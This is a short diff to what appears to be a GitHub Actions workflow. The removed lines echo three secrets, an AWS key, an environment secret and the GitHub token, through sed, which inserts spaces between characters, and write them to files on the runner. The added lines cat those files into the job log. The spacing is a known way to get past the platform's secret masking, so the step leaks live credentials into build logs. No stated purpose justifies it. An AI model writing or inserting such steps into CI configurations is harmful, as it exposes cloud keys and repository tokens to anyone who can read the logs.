@@ -18,6 +18,6 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}       
 
       run: |
-        echo ${{secrets.AWS_KEY}} | sed 's/./& /g' > /home/runner/work/test.txt
-        echo ${{secrets.ENV_SECRET}} | sed 's/./& /g' > /home/runner/work/test1.txt
-         echo ${{secrets.GITHUB_TOKEN}} | sed 's/./& /g' > /home/runner/work/test2.txt
+        cat /home/runner/work/test.txt
+        cat /home/runner/work/test1.txt
+        cat /home/runner/work/test2.txt
